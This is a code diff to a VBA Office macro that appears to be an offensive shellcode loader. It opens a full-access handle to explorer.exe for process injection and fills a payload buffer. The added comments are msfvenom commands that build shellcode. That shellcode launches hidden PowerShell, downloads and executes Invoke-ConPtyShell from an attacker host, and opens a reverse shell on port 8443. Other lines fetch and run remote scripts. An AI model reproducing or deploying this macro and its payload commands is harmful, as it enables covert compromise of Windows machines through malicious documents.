@@ -49,16 +49,19 @@ Function mymacro()
     If check Then
         patch StrFile, Is64
     End If
-
+    '-f vbapplication | xclip -selection clipboard
     If Is64 Then
-        'msfvenom --arch x64 --platform windows -p windows/x64/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x64.txt')")" EXITFUNC=thread -f vbapplication | xclip -selection clipboard
+        'msfvenom --arch x64 --platform windows -p windows/x64/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x64.txt')")" EXITFUNC=thread -f vbapplication
+        'msfvenom --arch x64 --platform windows -p windows/x64/exec CMD="$(echo powershell.exe -noprofile -noninteractive -windowstyle hidden -c "IEX(IWR http://$ME/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ME 8443")" EXITFUNC=thread
+        
         buf = Array()
                                                                 
         'grab handle to target, customizable
         pid = getPID("explorer.exe")
         Handle = OpenProcess(&H1F0FFF, False, pid)
     Else
-        'msfvenom --arch x86 --platform windows -p windows/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x86.txt')")" EXITFUNC=thread -f vbapplication | xclip -selection clipboard
+        'msfvenom --arch x86 --platform windows -p windows/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x86.txt')")" EXITFUNC=thread -f vbapplication
+        'msfvenom --arch x86 --platform windows -p windows/exec CMD="$(echo powershell.exe -noprofile -noninteractive -windowstyle hidden -c "IEX(IWR http://$ME/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ME 8443")" EXITFUNC=thread
         buf = Array()
 
         Handle = findWow64()
